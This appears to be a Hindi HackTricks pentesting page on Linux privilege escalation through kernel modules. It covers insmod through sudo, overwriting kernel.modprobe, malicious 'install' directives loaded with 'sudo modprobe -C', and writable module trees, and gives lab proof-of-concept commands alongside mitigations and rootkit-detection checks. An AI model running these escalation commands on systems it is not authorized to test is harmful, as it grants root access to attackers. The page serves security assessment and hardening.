# Kernel Modules और modprobe का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

## Kernel module और module-loading की गलत कॉन्फ़िगरेशन

Linux privilege escalation की समीक्षा के दौरान Kernel module support एक उच्च-प्रभाव वाला क्षेत्र है। हर unsigned-module संदेश को अपने-आप में exploitable न मानें, बल्कि इसका उपयोग व्यावहारिक सवालों के जवाब पाने के लिए करें।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- क्या मौजूदा user `sudo`, capabilities या किसी writable helper path के ज़रिए modules load कर सकता है?
- क्या module loading अब भी enabled है?
- क्या module signature enforcement disabled है?
- क्या module directories, module files या `modprobe.d` configuration paths writable हैं?<sup>[[16]](#references)</sup>
- क्या यह पुष्टि करने के लिए kernel logs पढ़े जा सकते हैं कि क्या हुआ?

त्वरित triage की शुरुआत नीचे दिए गए module-status, signature, logging और module-tree checks से करें।<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretation:

- `modules_disabled=1` का अर्थ है कि modules को न तो load किया जा सकता है, न unload; और reboot होने तक इसका मान वापस `0` पर सेट नहीं किया जा सकता।<sup>[[1]](#references)</sup>
- kernel command line पर `module.sig_enforce=1` या `CONFIG_MODULE_SIG_FORCE=y` होने पर modules का वैध रूप से signed होना आवश्यक है; अन्यथा unsigned modules load हो सकते हैं और kernel को taint कर सकते हैं।<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` होने पर `dmesg` पर कोई प्रतिबंध नहीं होता; इसका मान `1` होने पर access के लिए `CAP_SYSLOG` आवश्यक है।<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` के अंतर्गत writable paths खतरनाक हैं, क्योंकि modules load करते समय `modprobe` उस tree और उसके dependency data में खोज करता है।<sup>[[8]](#references)</sup>

### Module load करना और kernel output पढ़ना

यदि आपके पास local module load करने की वैध अनुमति है, तो `insmod` आपके द्वारा दी गई सटीक `.ko` file insert करता है। Load के हिस्से के रूप में module का init function चलता है, और `printk()` से लिखे गए messages kernel log buffer में जाते हैं, जिसे आम तौर पर `dmesg` से पढ़ा जाता है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

एक न्यूनतम review workflow में metadata देखने के लिए `modinfo`, module load और remove करने के लिए `insmod` और `rmmod`, loaded state की पुष्टि के लिए `lsmod`, और kernel logs देखने के लिए `dmesg` का उपयोग होता है।<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

यदि `sudo -l` में `insmod`, `modprobe` या इनके आसपास के किसी wrapper की अनुमति हो, तो इसे गंभीर जोखिम मानें: `sudo -l` चलाने वाले उपयोगकर्ता के विशेषाधिकारों की सूची दिखाता है, और kernel module लोड करने के लिए `CAP_SYS_MODULE` आवश्यक है। सीधे capability-आधारित तरीकों के लिए [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) देखें।<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo-allowed `insmod`

ऐसा sudo नियम जो उपयोगकर्ता को `insmod` चलाने की अनुमति देता है, किसी सामान्य प्रशासनिक सहायक को अनुमति देने जैसा नहीं है। मॉड्यूल का initialization कोड लोड किए जाने के दौरान चलता है, इसलिए व्यावहारिक समीक्षा का सवाल यह है कि क्या यह उपयोगकर्ता लोड किए जा रहे मॉड्यूल को चुन या संशोधित कर सकता है।<sup>[[3]](#references)</sup>

निम्नलिखित सामान्य समीक्षा प्रक्रिया किसी संभावित मॉड्यूल के लिए निरीक्षण, लोड, स्थिति, लॉग और हटाने की जाँचों को दोहराती है।<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

यदि user कोई भी मनमानी `.ko` फ़ाइल दे सकता है, तो authorized assessment में इस नियम को पूरे system से compromise के रूप में देखा जाना चाहिए। अधिक सुरक्षित operational pattern यह है कि `sudo` के ज़रिए module loading का अधिकार न सौंपें; यदि यह अपरिहार्य हो, तो सटीक path, ownership, permissions, signing policy और removal workflow को सीमित करें।<sup>[[3]](#references)[[10]](#references)</sup>

नियंत्रित lab में harmless module बनाने के तरीके के उदाहरण के तौर पर, नीचे एक न्यूनतम source और Makefile दिखाए गए हैं; `make -C /lib/modules/$(uname -r)/build M=$PWD` का रूप external modules के लिए kernel के documented kbuild workflow का अनुसरण करता है।<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

केवल अधिकृत लैब में build और load करें; kbuild बाहरी मॉड्यूल build करता है, और load/remove commands kernel module interfaces को invoke करते हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` के दुरुपयोग की जाँच

`kernel.modprobe` उस userspace helper का नाम बताता है जिसे kernel, module autoload requests के लिए चलाता है; यह sysctl explicit module insertion पर नहीं, autoloading पर असर डालता है। यदि कोई attacker इसे किसी writable executable path पर बदल सके और module request trigger कर सके, तो वह helper privileged code-execution path बन जाता है। इसे खाली string पर सेट करने से autoload requests बंद हो जाती हैं; यदि `CONFIG_STATIC_USERMODEHELPER=y` है, तो non-empty value को compiled-in static helper path से override कर दिया जाता है।<sup>[[1]](#references)</sup>

Kernel sysctl interface के ज़रिए मौजूदा helper path जाँचें और target के ownership तथा mode का निरीक्षण करें।<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

जाँचें कि sysctl, delegated sudo rules या file capabilities को प्रभावित किया जा सकता है या नहीं।<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

निम्न लैब-तक-सीमित पैटर्न helper path बदलता है और documented module-autoload request ट्रिगर करता है; इसका उपयोग केवल isolated, authorized system पर करें।<sup>[[1]](#references)</sup>

मौजूदा Linux kernels पर, generic trigger के रूप में किसी unknown executable का उपयोग न करें: legacy custom binary-format module autoloading को Linux 6.14 में हटा दिया गया था, जबकि kernel documentation में unknown filesystem type को module-autoload request path के रूप में पहचाना गया है।<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

मजबूत सुरक्षा वाले सिस्टम पर, यह तब विफल होना चाहिए जब अनुमतियाँ गैर-विशेषाधिकार प्राप्त उपयोगकर्ताओं को `kernel.modprobe` में लिखने से रोकती हों, helper path लिखने योग्य न हो, या module autoloading अक्षम हो।<sup>[[1]](#references)</sup>

### लिखने योग्य `modprobe.d` configuration और `sudo modprobe -C`

किसी module को resolve करने से पहले, `modprobe` configuration directories से `.conf` फ़ाइलें पढ़ता है, जैसे `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` और `/lib/modprobe.d`, प्राथमिकता के क्रम में। उच्च प्राथमिकता वाली directory में मौजूद समान नाम की फ़ाइल, कम प्राथमिकता वाली फ़ाइल को छिपा देती है। इससे भी महत्वपूर्ण बात यह है कि `install <module> <command>` directive उस module को insert करने के **बजाय** एक मनमाना shell command चलाता है। इसलिए, लिखने योग्य configuration path बाद में किसी privileged `modprobe` caller के credentials के तहत विलंबित command execution का कारण बन सकता है; kernel module signature enforcement इस userspace command को authenticate नहीं करता।<sup>[[16]](#references)</sup>

Directory और file permissions की जाँच करें, फिर प्रभावी configuration का निरीक्षण करें। Resolution की समीक्षा के लिए `modprobe -n -v` सुरक्षित है, क्योंकि dry-run mode न तो module insert करता है और न ही `install`/`remove` command चलाता है। पुराने `--showconfig` spelling के बजाय `modprobe -c` को प्राथमिकता दें; मौजूदा kmod documentation के अनुसार, kmod 36 के बाद इसे हटाया जाना है।<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe` के लिए unrestricted sudo rule का दुरुपयोग तब भी किया जा सकता है, जब arbitrary `.ko` files signature verification पास न कर सकें: `-C` हमलावर-नियंत्रित configuration directory चुनता है, जहाँ से sudo द्वारा launch की गई process `install` command चला सकती है।<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Mitigation के लिए, sudo के ज़रिए `modprobe` को बिना argument प्रतिबंधों के चलाने की अनुमति न दें, हर configuration directory को root-owned और non-writable रखें, और अप्रत्याशित `install`/`remove` directives की समीक्षा करें। जब किसी trusted administrative workflow को एक module के लिए ऐसी directives को bypass करना आवश्यक हो, तो `modprobe --ignore-install` उस नामित module के लिए उन्हें अनदेखा करता है, लेकिन dependencies के अपने commands फिर भी हो सकते हैं।<sup>[[8]](#references)[[16]](#references)</sup>

### Writable `/lib/modules` की समीक्षा

Writable module directories से module replacement, malicious module planting या auto-load abuse संभव हो सकता है—यह इस पर निर्भर करता है कि बाद में `modprobe` को कैसे invoke किया जाता है; modules को resolve करते समय `modprobe`, `/lib/modules/$(uname -r)` में खोजता है और उसके dependency data का उपयोग करता है।<sup>[[8]](#references)</sup>

सक्रिय kernel release की module tree के अंतर्गत मौजूद writable module files और dependency/alias metadata की समीक्षा करें।<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

यदि आपको लिखने योग्य मॉड्यूल सामग्री मिलती है, तो जाँचें कि `modprobe` निर्भरताओं को कैसे हल करता है और `modinfo` मॉड्यूल मेटाडेटा की रिपोर्ट कैसे करता है।<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

रक्षात्मक नोट्स:

- `/lib/modules` का स्वामित्व `root:root` के पास रखें और इसे उपयोगकर्ताओं के लिए लिखने योग्य न रखें।<sup>[[8]](#references)</sup>
- जहाँ परिचालन की दृष्टि से संभव हो, बूट के बाद `kernel.modules_disabled=1` सेट करें।<sup>[[1]](#references)</sup>
- उन सिस्टमों पर module signing लागू करें जिन्हें loadable modules की आवश्यकता होती है।<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules` और `modprobe.d` configuration directories में लिखे जाने की निगरानी करें; साथ ही अप्रत्याशित `insmod`/`modprobe` execution पर नज़र रखें।<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Module-based rootkit की जाँच

कोई malicious module syscalls, VFS या `/proc` views, network paths या credential checks को hook करके processes और files छिपा सकता है, traffic को redirect कर सकता है या secrets को intercept कर सकता है। यह `lsmod` द्वारा दिखाई गई module list से स्वयं को हटा भी सकता है। Persistence `modprobe.d` aliases या install rules, `/etc/modules-load.d`, किसी systemd unit, initramfs content या किसी वैध `.ko` file को बदलने से आ सकती है। `lsmod` का सामान्य परिणाम उपयोगी साक्ष्य है, लेकिन kernel-level compromise के कारण kernel द्वारा दी गई lists अविश्वसनीय हो सकती हैं। Loaded modules, disk पर मौजूद files, boot configuration, module-load logs और trusted external telemetry का परस्पर मिलान करें।

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

अनपेक्षित module names, paths, dependencies, signatures और load times की समीक्षा करें। Kernel taint और unsigned-module संदेश संकेत हैं, rootkit का प्रमाण नहीं। यदि rootkit का संदेह हो, तो live kernel output पर भरोसा करने से पहले किसी विश्वसनीय image या recovery environment से साक्ष्य एकत्र करें। [kernel vulnerability assessment](kernel-vulnerability-assessment.md) पेज में configuration और diagnostic exposure शामिल हैं, जिनमें tracefs और pinned BPF objects भी हैं।

## References

- [1] [/proc/sys/kernel/ के लिए दस्तावेज़ — Linux Kernel दस्तावेज़](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing सुविधा — Linux Kernel दस्तावेज़](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver के मूल सिद्धांत — Linux Kernel दस्तावेज़](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk के साथ संदेश लॉग करना — Linux Kernel दस्तावेज़](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [External Modules बनाना — Linux Kernel दस्तावेज़](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [टैग 'execve-v6.14-rc1' को मर्ज करें — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
